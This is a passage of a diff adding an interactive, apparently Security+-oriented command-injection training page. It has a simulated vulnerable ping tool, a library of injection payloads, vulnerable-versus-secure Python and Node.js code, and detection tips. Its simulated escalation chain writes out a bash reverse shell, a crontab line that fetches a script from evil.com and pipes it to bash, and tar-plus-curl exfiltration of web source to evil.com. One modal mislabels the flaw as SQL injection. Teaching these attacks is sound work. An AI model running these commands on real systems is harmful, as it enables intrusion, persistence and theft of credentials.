+<span class="t-success">[READY]</span> <span class="t-muted">Simulated server shell. Click an escalation step to execute.</span>
+<span class="t-muted">Running as: www-data (uid=33)</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="full" style="display:flex;justify-content:space-between;">
+      <button class="btn" onclick="goPhase(2)">← BACK</button>
+      <button class="btn primary" onclick="goPhase(4)">NEXT: DEFENSES →</button>
+    </div>
+
+  </div>
+
+  <!-- ═══════════════════════════════════════════
+       PHASE 4 — DEFENSES
+  ════════════════════════════════════════════ -->
+  <div class="phase single" id="phase4">
+
+    <div class="card green" style="margin-bottom:24px;">
+      <div class="card-title"><span class="dot"></span>HOW TO PREVENT COMMAND INJECTION</div>
+
+      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px;margin-bottom:24px;">
+
+        <div style="border:1px solid var(--border);padding:14px;">
+          <div style="font-family:var(--ui);font-weight:700;color:var(--green);margin-bottom:8px;">1. Avoid Shell Calls Entirely</div>
+          <div class="concept">The most effective defense — <strong>never pass user input to a shell</strong>. Use language-native libraries instead. Need to ping? Use a Python socket library. Need DNS lookup? Use a resolver API. Remove the shell invocation entirely.</div>
+        </div>
+
+        <div style="border:1px solid var(--border);padding:14px;">
+          <div style="font-family:var(--ui);font-weight:700;color:var(--green);margin-bottom:8px;">2. Parameterized Commands</div>
+          <div class="concept">If OS calls are unavoidable, use APIs that pass arguments as <strong>arrays</strong> — not shell strings. This tells the OS to treat input as a literal argument, never parsed by a shell interpreter. Never construct shell strings via concatenation.</div>
+        </div>
+
+        <div style="border:1px solid var(--border);padding:14px;">
+          <div style="font-family:var(--ui);font-weight:700;color:var(--green);margin-bottom:8px;">3. Input Validation — Allowlist</div>
+          <div class="concept">Define exactly what valid input looks like — then reject everything else. For a ping tool: only allow alphanumeric characters and dots (<code>^[a-zA-Z0-9.]+$</code>). Reject any input containing shell metacharacters.</div>
+        </div>
+
+        <div style="border:1px solid var(--border);padding:14px;">
+          <div style="font-family:var(--ui);font-weight:700;color:var(--green);margin-bottom:8px;">4. Least Privilege</div>
+          <div class="concept">Run the web application as a low-privilege OS user (e.g. <code>www-data</code> not <code>root</code>). Even if injection succeeds, the attacker's commands inherit minimal system access — limiting damage and making privilege escalation a required extra step.</div>
+        </div>
+
+        <div style="border:1px solid var(--border);padding:14px;">
+          <div style="font-family:var(--ui);font-weight:700;color:var(--green);margin-bottom:8px;">5. Containerization / Sandboxing</div>
+          <div class="concept">Run application processes in containers (Docker) or sandboxed environments with restricted filesystem access and no outbound network access. An escaped container still can't reach the host or internal network without additional vulnerabilities.</div>
+        </div>
+
+        <div style="border:1px solid var(--border);padding:14px;">
+          <div style="font-family:var(--ui);font-weight:700;color:var(--green);margin-bottom:8px;">6. WAF + Egress Filtering</div>
+          <div class="concept">A WAF can block known injection signatures at the perimeter. Egress (outbound) firewall rules prevent reverse shell callbacks — even if injection succeeds, the attacker can't phone home. Defense in depth reduces blast radius.</div>
+        </div>
+
+      </div>
+
+      <div class="divider">VULNERABLE vs SECURE CODE</div>
+
+      <div class="compare-row">
+        <div>
+          <div class="compare-bad">
+            <div class="compare-label">❌ Vulnerable — Shell String Concatenation</div>
+            <span style="color:var(--text-dim);">// Python — user input embedded in shell string</span><br>
+            import os<br><br>
+            host = request.args.get("host")<br>
+            result = os.system("ping -c 4 " + host)<br><br>
+            <span style="color:var(--red);"># Input: google.com; cat /etc/passwd</span><br>
+            <span style="color:var(--red);"># Both commands execute as app user!</span>
+          </div>
+        </div>
+        <div>
+          <div class="compare-good">
+            <div class="compare-label">✓ Secure — subprocess with args array</div>
+            <span style="color:var(--text-dim);">// Python — input passed as argument, not shell string</span><br>
+            import subprocess, re<br><br>
+            host = request.args.get("host")<br>
+            if not re.match(r'^[a-zA-Z0-9.\-]+$', host):<br>
+            &nbsp;&nbsp;abort(400)<br>
+            result = subprocess.run(<br>
+            &nbsp;&nbsp;["ping", "-c", "4", host], # array!<br>
+            &nbsp;&nbsp;shell=False, capture_output=True)<br>
+            <span style="color:var(--green);"># No shell interpreter invoked — safe</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="compare-row" style="margin-top:12px;">
+        <div>
+          <div class="compare-bad">
+            <div class="compare-label">❌ Vulnerable — Node.js exec()</div>
+            <span style="color:var(--text-dim);">// exec() spawns a shell — dangerous!</span><br>
+            const { exec } = require('child_process');<br><br>
+            const host = req.query.host;<br>
+            exec(`ping -c 4 ${host}`, (err, stdout) => {<br>
+            &nbsp;&nbsp;res.send(stdout);<br>
+            });<br>
+            <span style="color:var(--red);">// Template literal = string concat = injection</span>
+          </div>
+        </div>
+        <div>
+          <div class="compare-good">
+            <div class="compare-label">✓ Secure — Node.js execFile()</div>
+            <span style="color:var(--text-dim);">// execFile — NO shell, args as array</span><br>
+            const { execFile } = require('child_process');<br>
+            const validator = require('validator');<br><br>
+            const host = req.query.host;<br>
+            if (!validator.isFQDN(host) &amp;&amp; !validator.isIP(host))<br>
+            &nbsp;&nbsp;return res.status(400).send('Invalid host');<br>
+            execFile('ping', ['-c', '4', host], (err, out) => {<br>
+            &nbsp;&nbsp;res.send(out);<br>
+            });<br>
+            <span style="color:var(--green);">// execFile never invokes a shell</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="divider">DETECTION INDICATORS</div>
+
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;">
+        <div>
+          <p class="concept" style="margin-bottom:10px;"><strong>What to look for in logs:</strong></p>
+          <div class="callout danger" style="font-family:var(--mono);font-size:11px;line-height:2;">
+            Shell metacharacters in params: <span style="color:var(--red);">; | & ` $( )</span><br>
+            Known recon commands: <span style="color:var(--red);">whoami id uname cat /etc</span><br>
+            Outbound connections after injection (reverse shells)<br>
+            Unusual child processes spawned by the web server<br>
+            New cron jobs or startup scripts added to server
+          </div>
+        </div>
+        <div>
+          <p class="concept" style="margin-bottom:10px;"><strong>Security+ exam tips:</strong></p>
+          <div class="callout teal" style="font-family:var(--mono);font-size:11px;line-height:2;">
+            Command Injection = <span style="color:var(--teal);">Injection</span> category (OWASP A03)<br>
+            Best fix = <span style="color:var(--teal);">avoid shell calls</span> / use safe APIs<br>
+            Key term: <span style="color:var(--teal);">shell metacharacter</span><br>
+            Also look for: <span style="color:var(--teal);">OS command injection</span><br>
+            Testing tools: <span style="color:var(--teal);">Burp Suite, commix, manual</span><br>
+            Related: <span style="color:var(--teal);">RCE (Remote Code Execution)</span>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div style="display:flex;justify-content:flex-start;">
+      <button class="btn" onclick="goPhase(3)">← BACK</button>
+    </div>
+
+  </div>
+
+</div><!-- /container -->
+
+<!-- MODAL -->
+<div class="modal-overlay" id="attackModal">
+  <div class="modal">
+    <div class="modal-title" id="modalTitle">⚠ COMMAND INJECTION — SIMULATED EXECUTION</div>
+    <div class="modal-body" id="modalBody"></div>
+    <button class="btn primary" onclick="closeModal()">ACKNOWLEDGE</button>
+  </div>
+</div>
+
+<script>
+// ── STATE ──────────────────────────────────────────────────────────
+let currentOS  = 'linux';
+let currentPhase = 1;
+
+// ── PAYLOAD DEFINITIONS ────────────────────────────────────────────
+const PAYLOADS = {
+  linux: [
+    { name: 'Semicolon Separator', code: 'google.com; whoami', type: 'vuln',
+      desc: 'Runs second command unconditionally after the first.' },
+    { name: 'AND Operator', code: 'google.com && id', type: 'vuln',
+      desc: 'Runs second command only if ping succeeds.' },
+    { name: 'OR Operator', code: 'invalidhost || id', type: 'vuln',
+      desc: 'Runs second command only if ping fails — useful when host doesn\'t matter.' },
+    { name: 'Read /etc/passwd', code: 'google.com; cat /etc/passwd', type: 'vuln',
+      desc: 'Reads the Linux user database — reveals all system accounts.' },
+    { name: 'Pipe to grep', code: '127.0.0.1 | grep root /etc/passwd', type: 'vuln',
+      desc: 'Chains output — pipes ping result, filters for root account.' },
+    { name: 'Backtick Subshell', code: '`id`', type: 'vuln',
+      desc: 'Backtick executes the command and substitutes the output.' },
+    { name: 'Process Substitution', code: '$(uname -a)', type: 'vuln',
+      desc: '$() runs the subshell command; output is passed to ping.' },
+    { name: 'Legitimate Input', code: '8.8.8.8', type: 'safe',
+      desc: 'Valid IP address — normal expected use.' },
+  ],
+  windows: [
+    { name: 'Ampersand Separator', code: '127.0.0.1 & whoami', type: 'vuln',
+      desc: 'Windows CMD uses & to chain commands unconditionally.' },
+    { name: 'AND Operator', code: '127.0.0.1 && ipconfig', type: 'vuln',
+      desc: 'Runs second command only if ping exits successfully.' },
+    { name: 'OR Operator', code: 'badhost || net user', type: 'vuln',
+      desc: 'Runs net user if ping fails — enumerates all local users.' },
+    { name: 'Read User List', code: '127.0.0.1 & net user', type: 'vuln',
+      desc: 'net user enumerates all local Windows accounts.' },
+    { name: 'Read Hosts File', code: '127.0.0.1 & type C:\\Windows\\System32\\drivers\\etc\\hosts', type: 'vuln',
+      desc: 'Reads the Windows hosts file — reveals internal hostname mappings.' },
+    { name: 'System Info', code: '127.0.0.1 & systeminfo', type: 'vuln',
+      desc: 'Dumps OS version, hotfixes, and hardware info — valuable for exploit selection.' },
+    { name: 'Pipe Operator', code: '127.0.0.1 | dir C:\\', type: 'vuln',
+      desc: 'Lists root directory contents; pipe passes output along.' },
+    { name: 'Legitimate Input', code: '8.8.8.8', type: 'safe',
+      desc: 'Valid IP address — normal expected use.' },
+  ]
+};
+
+// ── SIMULATED OS OUTPUT ────────────────────────────────────────────
+function simulateOutput(input, os) {
+  const i = input.trim();
+
+  // Legitimate
+  if (/^[0-9]{1,3}(\.[0-9]{1,3}){3}$/.test(i) && !i.includes(' ') && !i.includes(';') && !i.includes('&') && !i.includes('|')) {
+    const ip = i;
+    return { safe: true, text: `PING ${ip}: 56 data bytes\n64 bytes from ${ip}: icmp_seq=0 ttl=55 time=12.4 ms\n64 bytes from ${ip}: icmp_seq=1 ttl=55 time=11.9 ms\n64 bytes from ${ip}: icmp_seq=2 ttl=55 time=13.1 ms\n\n--- ${ip} ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss` };
+  }
+
+  if (os === 'linux') {
+    if (/whoami/.test(i))   return { safe:false, cmd:'whoami', text:'www-data' };
+    if (/\bid\b/.test(i))   return { safe:false, cmd:'id', text:'uid=33(www-data) gid=33(www-data) groups=33(www-data)' };
+    if (/uname/.test(i))    return { safe:false, cmd:'uname -a', text:'Linux systools-server 5.15.0-78-generic #85-Ubuntu SMP x86_64 GNU/Linux' };
+    if (/passwd/.test(i))   return { safe:false, cmd:'cat /etc/passwd', text:'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\npostgres:x:109:117:PostgreSQL administrator:/var/lib/postgresql:/bin/bash\ndeployer:x:1001:1001::/home/deployer:/bin/bash' };
+    if (/ifconfig|hostname/.test(i)) return { safe:false, cmd:'ifconfig', text:'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n  inet 10.0.1.45  netmask 255.255.255.0  broadcast 10.0.1.255\n  ether 02:42:ac:11:00:03  txqueuelen 0  (Ethernet)\nlo: flags=73<UP,LOOPBACK,RUNNING>\n  inet 127.0.0.1  netmask 255.0.0.0' };
+    if (/ls/.test(i))        return { safe:false, cmd:'ls -la /', text:'total 72\ndrwxr-xr-x  20 root root  4096 Jan 12 09:14 .\ndrwxr-xr-x   4 root root  4096 Jan 12 09:14 var\ndrwxr-xr-x   2 root root  4096 Jan 12 09:14 etc\ndrwxr-xr-x  14 root root  4096 Jan 12 09:14 home\n-rw-r-----   1 root root  2048 Jan 10 22:30 .env  ← credentials file detected!' };
+    if (/grep/.test(i))      return { safe:false, cmd:'grep root /etc/passwd', text:'root:x:0:0:root:/root:/bin/bash' };
+    if (/`|(\$\()/.test(i))  return { safe:false, cmd:'subshell', text:'uid=33(www-data) gid=33(www-data) groups=33(www-data)' };
+    if (/netstat/.test(i))   return { safe:false, cmd:'netstat -an', text:'Proto  Local Address     Foreign Address   State\ntcp    0.0.0.0:80        0.0.0.0:*         LISTEN\ntcp    0.0.0.0:443       0.0.0.0:*         LISTEN\ntcp    0.0.0.0:5432      0.0.0.0:*         LISTEN  ← PostgreSQL exposed!' };
+    return { safe:false, cmd:'unknown', text:'sh: command executed successfully\n(output suppressed by server response filter)' };
+  } else {
+    if (/whoami/.test(i))      return { safe:false, cmd:'whoami', text:'SYSTOOLS-SRV\\IUSR_Web' };
+    if (/net user/.test(i))    return { safe:false, cmd:'net user', text:'User accounts for \\\\SYSTOOLS-SRV\n-----------------------------------------------\nAdministrator   DefaultAccount   Guest\nIUSR_Web        JohnDoe          SvcDeployer\nCommand completed successfully.' };
+    if (/ipconfig/.test(i))    return { safe:false, cmd:'ipconfig', text:'Windows IP Configuration\n\nEthernet adapter Ethernet0:\n   IPv4 Address. . . : 10.0.1.47\n   Subnet Mask . . . : 255.255.255.0\n   Default Gateway . : 10.0.1.1' };
+    if (/systeminfo/.test(i))  return { safe:false, cmd:'systeminfo', text:'Host Name:     SYSTOOLS-SRV\nOS Name:       Microsoft Windows Server 2019 Standard\nOS Version:    10.0.17763 N/A Build 17763\nHotfix(s):     3 Hotfix(s) Installed. [01]: KB4534119  [02]: KB4540673  [03]: KB4552931' };
+    if (/type.*hosts/.test(i)) return { safe:false, cmd:'type hosts', text:'127.0.0.1 localhost\n10.0.1.10 db-server.internal\n10.0.1.11 auth.internal\n10.0.1.20 admin-panel.internal  ← internal admin host discovered!' };
+    if (/dir/.test(i))         return { safe:false, cmd:'dir C:\\', text:' Volume in drive C has no label.\n 09/15/2024  10:23    <DIR>          inetpub\n 09/15/2024  10:24    <DIR>          Program Files\n 01/08/2025  16:02    <DIR>          Users\n 01/08/2025  16:03                92 deploy_creds.txt  ← credential file!' };
+    return { safe:false, cmd:'cmd.exe', text:'Command executed. Output suppressed.' };
+  }
+}
+
+// ── SET OS ────────────────────────────────────────────────────────
+function setOS(os, btn) {
+  currentOS = os;
+  document.querySelectorAll('.os-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  renderPayloads();
+  if (os === 'linux') {
+    document.getElementById('webappUrl').textContent   = 'http://systools.internal/ping?host=';
+    document.getElementById('toolTitle').textContent   = '🌐 Network Ping Tool';
+    document.getElementById('toolDesc').textContent    = 'Enter a hostname or IP address to ping. Results will be displayed below.';
+    document.getElementById('inputLabel').textContent  = 'Hostname / IP Address';
+    document.getElementById('hostInput').placeholder   = 'e.g.  google.com; cat /etc/passwd';
+    document.getElementById('shellTitle').textContent  = 'bash — shell_exec()';
+    document.getElementById('lcText').textContent      = 'ping -c 4 ';
+  } else {
+    document.getElementById('webappUrl').textContent   = 'http://systools.internal/ping?host=';
+    document.getElementById('toolTitle').textContent   = '🌐 Network Ping Tool';
+    document.getElementById('toolDesc').textContent    = 'Enter a hostname or IP address to ping. Results will be displayed below.';
+    document.getElementById('inputLabel').textContent  = 'Hostname / IP Address';
+    document.getElementById('hostInput').placeholder   = 'e.g.  127.0.0.1 & whoami';
+    document.getElementById('shellTitle').textContent  = 'cmd.exe — shell_exec()';
+    document.getElementById('lcText').textContent      = 'ping ' + (os === 'windows' ? '-n 4 ' : '-c 4 ');
+  }
+}
+
+function renderPayloads() {
+  const grid = document.getElementById('payloadLibrary');
+  grid.innerHTML = '<div class="payload-grid">' +
+    PAYLOADS[currentOS].map(p => `
+      <div class="payload-item ${p.type === 'safe' ? 'safe' : ''}" onclick="loadPayload(${JSON.stringify(p.code).replace(/'/g,'&apos;')})">
+        <div class="pl-name">${p.name}</div>
+        <div class="pl-code">${escHtml(p.code)}</div>
+      </div>`).join('') +
+    '</div>';
+}
+
+function loadPayload(code) {
+  document.getElementById('hostInput').value = code;
+  updateLiveCommand();
+}
+
+function updateLiveCommand() {
+  const v = document.getElementById('hostInput').value;
+  const base = currentOS === 'linux' ? 'ping -c 4 ' : 'ping -n 4 ';
+  const el = document.getElementById('lcText');
+  if (!v) { el.innerHTML = escHtml(base); return; }
+
+  const hasInject = /[;|&`$()]/.test(v) || /whoami|id|cat|uname|ls|net |ipconfig|dir |type |grep|netstat|ifconfig/.test(v);
+  if (hasInject) {
+    const parts = v.split(/([;|&`$()]+)/);
+    let html = escHtml(base);
+    parts.forEach(p => {
+      if (/^[;|&`$()]+$/.test(p)) html += `<span class="t-error">${escHtml(p)}</span>`;
+      else html += `<span class="t-inject">${escHtml(p)}</span>`;
+    });
+    el.innerHTML = html;
+  } else {
+    el.innerHTML = escHtml(base + v);
+  }
+}
+
+// ── RUN PING ──────────────────────────────────────────────────────
+function runPing() {
+  const input = document.getElementById('hostInput').value.trim();
+  const output = document.getElementById('pingOutput');
+  const log = document.getElementById('execLog');
+
+  if (!input) { output.textContent = 'Error: No input provided.'; return; }
+
+  updateLiveCommand();
+  addLog(log, 't-warning', `REQUEST  GET /ping?host=${escHtml(input)}`);
+
+  const result = simulateOutput(input, currentOS);
+
+  setTimeout(() => {
+    if (result.safe) {
+      addLog(log, 't-info',    `EXEC     ${currentOS === 'linux' ? 'ping -c 4' : 'ping -n 4'} ${escHtml(input)}`);
+      addLog(log, 't-success', `RESULT   Normal ping — 0 anomalies`);
+      output.innerHTML = `<span class="t-success">${escHtml(result.text)}</span>`;
+    } else {
+      addLog(log, 't-error',   `INJECT   Shell metacharacter detected — injection likely`);
+      addLog(log, 't-error',   `EXEC     Injected command: ${escHtml(result.cmd)}`);
+      addLog(log, 't-error',   `OUTPUT   Server response contains injected output`);
+      output.innerHTML = `<span class="t-warning">--- PING OUTPUT ---</span>\n<span class="t-muted">Request timeout for icmp_seq 0</span>\n\n<span class="t-error">--- INJECTED COMMAND OUTPUT ---</span>\n<span class="t-inject">${escHtml(result.text)}</span>`;
+      showModal("Command Injection Executed!", `Input: "${input}"\n\nThe server passed your input directly to shell_exec(). The injected command ran with the same privileges as the web server process (www-data).\n\nOutput above is real operating system data returned to the attacker's browser.`);
+    }
+  }, 350);
+}
+
+// ── ESCALATION CHAIN ──────────────────────────────────────────────
+const ESC_STEPS = [
+  null,
+  {
+    cmd: 'google.com; id && whoami && uname -a',
+    title: 'Reconnaissance Confirmed',
+    output: [
+      ['t-muted',    '$ ping -c 4 google.com; id && whoami && uname -a'],
+      ['t-muted',    'Request timeout for icmp_seq 0'],
+      ['t-muted',    ''],
+      ['t-inject',   'uid=33(www-data) gid=33(www-data) groups=33(www-data)'],
+      ['t-inject',   'www-data'],
+      ['t-inject',   'Linux systools-server 5.15.0-78-generic #85-Ubuntu SMP x86_64 GNU/Linux'],
+      ['t-success',  ''],
+      ['t-success',  '[+] Execution confirmed. Running as www-data on Linux 5.15.'],
+      ['t-success',  '[+] Not root — but a foothold is established.'],
+    ],
+    modal: 'Foothold Established!\n\nExecution confirmed on the remote server. The process runs as www-data — low privilege but enough to explore the filesystem, read application configs, and launch the next stage.\n\nA penetration tester records this as RCE (Remote Code Execution).'
+  },
+  {
+    cmd: '; cat /etc/passwd | head -20',
+    title: 'Sensitive File Read',
+    output: [
+      ['t-muted',  '$ cat /etc/passwd | head -20'],
+      ['t-inject', 'root:x:0:0:root:/root:/bin/bash'],
+      ['t-inject', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin'],
+      ['t-inject', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin'],
+      ['t-inject', 'postgres:x:109:117:PostgreSQL:/var/lib/postgresql:/bin/bash'],
+      ['t-inject', 'deployer:x:1001:1001::/home/deployer:/bin/bash'],
+      ['t-muted',  '...'],
+      ['t-success','[+] postgres and deployer have interactive shells — potential targets.'],
+      ['t-warning','[!] Check /var/www/html for DB credentials in config files.'],
+    ],
+    modal: 'User Enumeration Complete!\n\n/etc/passwd reveals all OS accounts. The "postgres" and "deployer" accounts have interactive shells — valuable for privilege escalation attempts.\n\nNext step: read application source files for hardcoded database passwords.'
+  },
+  {
+    cmd: '; ifconfig && netstat -an && cat /etc/hosts',
+    title: 'Network Map Obtained',
+    output: [
+      ['t-muted',   '$ ifconfig && netstat -an && cat /etc/hosts'],
+      ['t-inject',  'inet 10.0.1.45  netmask 255.255.255.0'],
+      ['t-inject',  'tcp  0.0.0.0:5432  LISTEN  ← PostgreSQL exposed internally'],
+      ['t-inject',  'tcp  0.0.0.0:6379  LISTEN  ← Redis exposed internally'],
+      ['t-muted',   ''],
+      ['t-inject',  '10.0.1.10  db-server.internal'],
+      ['t-inject',  '10.0.1.11  auth-server.internal'],
+      ['t-inject',  '10.0.1.20  admin-panel.internal'],
+      ['t-success', '[+] Internal network mapped: 10.0.1.0/24'],
+      ['t-warning', '[!] Pivot targets identified: db-server, auth-server, admin-panel'],
+    ],
+    modal: 'Internal Network Mapped!\n\nThe server\'s /etc/hosts and network config reveal the internal topology. PostgreSQL and Redis are listening internally.\n\nAn attacker can now target these services from the compromised host — this is called "lateral movement" or "pivoting."'
+  },
+  {
+    cmd: '; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
+    title: 'Reverse Shell Deployed',
+    output: [
+      ['t-muted',   '$ bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'],
+      ['t-warning', '[*] Sending reverse shell to attacker at 10.0.0.1:4444...'],
+      ['t-muted',   ''],
+      ['t-error',   '--- ATTACKER MACHINE (nc -lvnp 4444) ---'],
+      ['t-inject',  'connect to [10.0.0.1] from (UNKNOWN) [10.0.1.45] 51234'],
+      ['t-root',    'www-data@systools-server:/var/www/html$ '],
+      ['t-muted',   ''],
+      ['t-success', '[+] Interactive reverse shell established.'],
+      ['t-success', '[+] Full interactive access to target. No further HTTP needed.'],
+    ],
+    modal: 'Reverse Shell Established!\n\nThe server connected BACK to the attacker\'s machine on port 4444. The attacker now has a fully interactive terminal — identical to SSH access — without any credentials.\n\nThis is the most significant escalation: HTTP is no longer needed. The attacker operates directly on the OS.'
+  },
+  {
+    cmd: '; echo "* * * * * curl http://evil.com/shell.sh | bash" | crontab -',
+    title: 'Persistence Installed',
+    output: [
+      ['t-muted',   '$ echo "* * * * * curl http://evil.com/shell.sh | bash" | crontab -'],
+      ['t-inject',  'Cron job added for www-data'],
+      ['t-muted',   ''],
+      ['t-error',   '$ crontab -l'],
+      ['t-inject',  '* * * * * curl http://evil.com/shell.sh | bash'],
+      ['t-muted',   ''],
+      ['t-success', '[+] Persistence established via crontab.'],
+      ['t-warning', '[!] Shell will re-execute every 60 seconds.'],
+      ['t-warning', '[!] Patching the injection will NOT remove this cron job.'],
+    ],
+    modal: 'Persistence Established!\n\nA cron job now runs every minute, re-downloading and executing a shell script from the attacker\'s server.\n\nCritical implication: even if the SQL injection vulnerability is patched, the cron job remains. Defenders must also audit crontab, startup scripts, and new user accounts.'
+  },
+  {
+    cmd: '; tar czf - /var/www/html | curl -X POST --data-binary @- http://evil.com/exfil',
+    title: 'Source Code Exfiltrated',
+    output: [
+      ['t-muted',   '$ tar czf - /var/www/html | curl -X POST --data-binary @- http://evil.com/exfil'],
+      ['t-warning', '[*] Compressing /var/www/html (application source)...'],
+      ['t-inject',  '  % Total    % Received  % Xferd  Average Speed'],
+      ['t-inject',  '100  4.2M   100  4.2M    0     0  1.1MB/s  00:04'],
+      ['t-muted',   ''],
+      ['t-error',   '--- SENT TO evil.com ---'],
+      ['t-inject',  'config/database.php  ← DB credentials'],
+      ['t-inject',  'config/app.php       ← secret key'],
+      ['t-inject',  '.env                 ← API keys, secrets'],
+      ['t-inject',  'includes/auth.php    ← authentication logic'],
+      ['t-success', '[+] 4.2MB of application source exfiltrated successfully.'],
+    ],
+    modal: 'Full Source Code Exfiltrated!\n\nThe entire web application — including database credentials, API keys, secret keys, and authentication logic — has been sent to the attacker\'s server.\n\nWith credentials, the attacker can now directly access the database, cloud APIs, and any third-party integrations the app uses.'
+  },
+];
+
+function runEscStep(n) {
+  const step = ESC_STEPS[n];
+  const term = document.getElementById('escTerminal');
+  const stepEl = document.getElementById('esc' + n);
+  stepEl.classList.add('done');
+
+  term.innerHTML += `\n<span class="t-muted">───────────────────────────────────────</span>\n`;
+  term.innerHTML += `<span class="t-warning">[STEP ${n}] ${step.title.toUpperCase()}</span>\n`;
+
+  let delay = 0;
+  step.output.forEach(line => {
+    setTimeout(() => {
+      term.innerHTML += `<span class="${line[0]}">${escHtml(line[1])}</span>\n`;
+      term.scrollTop = term.scrollHeight;
+    }, delay);
+    delay += 120;
+  });
+
+  setTimeout(() => {
+    showModal(`Step ${n}: ${step.title}`, step.modal);
+  }, delay + 200);
+}
+
+// ── NAVIGATION ────────────────────────────────────────────────────
+function goPhase(n) {
+  document.querySelectorAll('.phase').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.phase-btn').forEach((b, i) => {
+    b.classList.remove('active');
+    if (i + 1 < n) b.classList.add('done'); else b.classList.remove('done');
+  });
+  document.getElementById('phase' + n).classList.add('active');
+  document.querySelectorAll('.phase-btn')[n - 1].classList.add('active');
+  currentPhase = n;
+  document.getElementById('progressFill').style.width = (n * 25) + '%';
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+// ── HELPERS ───────────────────────────────────────────────────────
+function addLog(el, cls, msg) {
+  const ts = new Date().toTimeString().slice(0,8);
+  el.innerHTML += `<div><span style="color:#2e5038;font-family:var(--mono);font-size:11px;">[${ts}]</span> <span class="${cls}" style="font-family:var(--mono);font-size:11px;">${msg}</span></div>`;
+  el.scrollTop = el.scrollHeight;
+}
+
+function clearLog(id) {
+  const el = document.getElementById(id);
+  el.innerHTML = '<span class="t-success">[READY]</span><span class="t-muted"> Log cleared.</span>';
+}
+
+function escHtml(s) {
+  if (!s) return '';
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function showModal(title, msg) {
+  document.getElementById('modalTitle').textContent = '⚠ ' + title;
+  document.getElementById('modalBody').innerHTML = msg.replace(/\n/g,'<br>');
+  document.getElementById('attackModal').classList.add('show');
+}
+
+function closeModal() {
+  document.getElementById('attackModal').classList.remove('show');
+}
+
+// ── INIT ─────────────────────────────────────────────────────────
+document.getElementById('hostInput').addEventListener('input', updateLiveCommand);
+renderPayloads();
+</script>
+</body>
+</html>
